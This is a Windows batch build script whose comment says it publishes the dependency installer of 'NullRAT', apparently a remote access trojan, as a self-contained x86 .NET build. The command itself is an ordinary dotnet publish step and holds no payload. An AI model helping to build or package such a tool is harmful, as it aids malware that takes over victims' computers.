@echo off

:: Publish NullRAT Dependency Installer 
:: for Windows x86 | Self Contained & Trimmed
dotnet publish "Dependencies.csproj" --output build\ --framework net6.0 -r win-x86 -c release --self-contained true